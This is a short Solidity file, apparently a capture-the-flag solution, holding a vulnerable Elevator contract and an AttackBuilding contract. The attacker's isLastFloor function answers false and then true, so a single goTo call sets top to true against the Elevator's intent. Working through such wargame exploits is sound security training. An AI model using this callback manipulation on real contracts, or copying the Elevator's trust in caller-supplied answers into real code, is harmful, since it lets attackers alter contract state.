// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackBuilding {
    Elevator elevator;

    constructor(address _elevAddress) {
        elevator = Elevator(_elevAddress);
    }

    bool public isTop = false;
    function isLastFloor(uint256 _floor) external returns (bool){
        if (!isTop) {
            isTop = true;
            return false;
        }
        return true;
    }

    function attackGoTo() public{
        elevator.goTo(1);
    }
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}